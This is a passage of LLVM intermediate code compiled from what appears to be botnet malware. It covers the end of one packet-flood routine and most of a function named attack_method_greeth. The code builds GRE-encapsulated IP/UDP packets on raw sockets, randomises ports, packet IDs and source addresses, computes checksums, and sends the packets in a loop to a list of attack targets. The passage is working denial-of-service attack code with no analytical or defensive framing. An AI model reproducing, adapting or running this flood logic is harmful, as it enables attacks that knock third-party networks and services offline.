  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 3
  %316 = load i16, i16* %315, align 4
  %317 = zext i16 %316 to i32
  %318 = sub nsw i32 %317, 1000
  %319 = xor i32 %318, -1
  %320 = trunc i32 %319 to i16
  %321 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 3
  store i16 %320, i16* %322, align 4
  br label %323

; <label>:323:                                    ; preds = %308, %304
  %324 = load i16, i16* %16, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %333

; <label>:327:                                    ; preds = %323
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 0
  store i16 %330, i16* %332, align 2
  br label %333

; <label>:333:                                    ; preds = %327, %323
  %334 = load i16, i16* %17, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  br i1 %336, label %337, label %343

; <label>:337:                                    ; preds = %333
  %338 = call i32 @rand_next()
  %339 = and i32 %338, 65535
  %340 = trunc i32 %339 to i16
  %341 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 1
  store i16 %340, i16* %342, align 2
  br label %343

; <label>:343:                                    ; preds = %337, %333
  %344 = load i8, i8* %20, align 1
  %345 = icmp ne i8 %344, 0
  br i1 %345, label %350, label %346

; <label>:346:                                    ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 9
  store i32 %347, i32* %349, align 4
  br label %356

; <label>:350:                                    ; preds = %343
  %351 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 9
  %353 = load i32, i32* %352, align 4
  %354 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 9
  store i32 %353, i32* %355, align 4
  br label %356

; <label>:356:                                    ; preds = %350, %346
  %357 = load i8, i8* %19, align 1
  %358 = icmp ne i8 %357, 0
  br i1 %358, label %359, label %362

; <label>:359:                                    ; preds = %356
  %360 = load i8*, i8** %31, align 8
  %361 = load i32, i32* %18, align 4
  call void @rand_str(i8* %360, i32 %361)
  br label %362

; <label>:362:                                    ; preds = %359, %356
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i16 0, i16* %364, align 2
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = bitcast %struct.iphdr* %365 to i16*
  %367 = call zeroext i16 @checksum_generic(i16* %366, i32 20)
  %368 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i16 %367, i16* %369, align 2
  %370 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 7
  store i16 0, i16* %371, align 2
  %372 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %373 = bitcast %struct.iphdr* %372 to i16*
  %374 = call zeroext i16 @checksum_generic(i16* %373, i32 20)
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 %374, i16* %376, align 2
  %377 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %380 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %381 = bitcast %struct.udphdr* %380 to i8*
  %382 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i32 0, i32 2
  %384 = load i16, i16* %383, align 2
  %385 = load i32, i32* %18, align 4
  %386 = sext i32 %385 to i64
  %387 = add i64 8, %386
  %388 = trunc i64 %387 to i32
  %389 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %379, i8* %381, i16 zeroext %384, i32 %388)
  %390 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 3
  store i16 %389, i16* %391, align 2
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 0
  %397 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %396, i32 0, i32 0
  store i16 2, i16* %397, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 9
  %400 = load i32, i32* %399, align 4
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 0
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %405, i32 0, i32 2
  %407 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %406, i32 0, i32 0
  store i32 %400, i32* %407, align 4
  %408 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 0
  %413 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %412, i32 0, i32 1
  store i16 0, i16* %413, align 2
  %414 = load i32, i32* %10, align 4
  %415 = load i8*, i8** %26, align 8
  %416 = load i32, i32* %18, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 52, %417
  %419 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %420 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = bitcast %struct.sockaddr_in* %424 to %struct.sockaddr*
  store %struct.sockaddr* %425, %struct.sockaddr** %419, align 8
  %426 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %427 = load %struct.sockaddr*, %struct.sockaddr** %426, align 8
  %428 = call i64 @sendto(i32 %414, i8* %415, i64 %418, i32 16384, %struct.sockaddr* %427, i32 16)
  br label %429

; <label>:429:                                    ; preds = %362
  %430 = load i32, i32* %9, align 4
  %431 = add nsw i32 %430, 1
  store i32 %431, i32* %9, align 4
  br label %243

; <label>:432:                                    ; preds = %243
  br label %242

; <label>:433:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 1458)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %472

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %472

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %252, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %255

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %12, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %18, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 66, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 zeroext %141) #7
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %13, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %15, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %158

; <label>:154:                                    ; preds = %101
  %155 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 4
  store i16 %155, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %154, %101
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 6
  store i8 47, i8* %160, align 1
  %161 = load i32, i32* %21, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 8
  store i32 %161, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 1
  %169 = load i32, i32* %168, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 9
  store i32 %169, i32* %171, align 4
  %172 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %173 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %174 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %173, i32 0, i32 1
  store i16 %172, i16* %174, align 2
  %175 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %176 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %177 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %176, i32 0, i32 2
  store i16 %175, i16* %177, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %18, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 28, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %13, align 2
  %199 = zext i16 %198 to i32
  %200 = xor i32 %199, -1
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %14, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %15, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %158
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %158
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 17, i8* %216, align 1
  %217 = call i32 @rand_next()
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load i8, i8* %20, align 1
  %221 = icmp ne i8 %220, 0
  br i1 %221, label %222, label %228

; <label>:222:                                    ; preds = %214
  %223 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %236

; <label>:228:                                    ; preds = %214
  %229 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %236

; <label>:236:                                    ; preds = %228, %222
  %237 = load i16, i16* %16, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %17, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  br label %252

; <label>:252:                                    ; preds = %236
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %9, align 4
  br label %96

; <label>:255:                                    ; preds = %96
  br label %256

; <label>:256:                                    ; preds = %471, %255
  store i32 0, i32* %9, align 4
  br label %257

; <label>:257:                                    ; preds = %468, %256
  %258 = load i32, i32* %9, align 4
  %259 = load i8, i8* %5, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  br i1 %261, label %262, label %471

; <label>:262:                                    ; preds = %257
  %263 = load i8**, i8*** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8*, i8** %263, i64 %265
  %267 = load i8*, i8** %266, align 8
  store i8* %267, i8** %30, align 8
  %268 = load i8*, i8** %30, align 8
  %269 = bitcast i8* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %31, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.grehdr*
  store %struct.grehdr* %272, %struct.grehdr** %32, align 8
  %273 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %274 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %273, i64 1
  %275 = bitcast %struct.grehdr* %274 to %struct.ethhdr*
  store %struct.ethhdr* %275, %struct.ethhdr** %33, align 8
  %276 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %277 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %276, i64 1
  %278 = bitcast %struct.ethhdr* %277 to %struct.iphdr*
  store %struct.iphdr* %278, %struct.iphdr** %34, align 8
  %279 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i64 1
  %281 = bitcast %struct.iphdr* %280 to %struct.udphdr*
  store %struct.udphdr* %281, %struct.udphdr** %35, align 8
  %282 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i64 1
  %284 = bitcast %struct.udphdr* %283 to i8*
  store i8* %284, i8** %36, align 8
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = icmp slt i32 %291, 32
  br i1 %292, label %293, label %314

; <label>:293:                                    ; preds = %262
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 1
  %299 = load i32, i32* %298, align 4
  %300 = call i32 @ntohl(i32 %299) #7
  %301 = call i32 @rand_next()
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 2
  %307 = load i8, i8* %306, align 4
  %308 = zext i8 %307 to i32
  %309 = lshr i32 %301, %308
  %310 = add i32 %300, %309
  %311 = call i32 @htonl(i32 %310) #7
  %312 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  br label %314

; <label>:314:                                    ; preds = %293, %262
  %315 = load i32, i32* %21, align 4
  %316 = icmp eq i32 %315, -1
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %314
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  br label %321

; <label>:321:                                    ; preds = %317, %314
  %322 = load i16, i16* %13, align 2
  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  br i1 %324, label %325, label %340

; <label>:325:                                    ; preds = %321
  %326 = call i32 @rand_next()
  %327 = and i32 %326, 65535
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  %331 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = sub nsw i32 %334, 1000
  %336 = xor i32 %335, -1
  %337 = trunc i32 %336 to i16
  %338 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 3
  store i16 %337, i16* %339, align 4
  br label %340

; <label>:340:                                    ; preds = %325, %321
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %350

; <label>:344:                                    ; preds = %340
  %345 = call i32 @rand_next()
  %346 = and i32 %345, 65535
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  store i16 %347, i16* %349, align 2
  br label %350

; <label>:350:                                    ; preds = %344, %340
  %351 = load i16, i16* %17, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i32 0, i32 1
  store i16 %357, i16* %359, align 2
  br label %360

; <label>:360:                                    ; preds = %354, %350
  %361 = load i8, i8* %20, align 1
  %362 = icmp ne i8 %361, 0
  br i1 %362, label %367, label %363

; <label>:363:                                    ; preds = %360
  %364 = call i32 @rand_next()
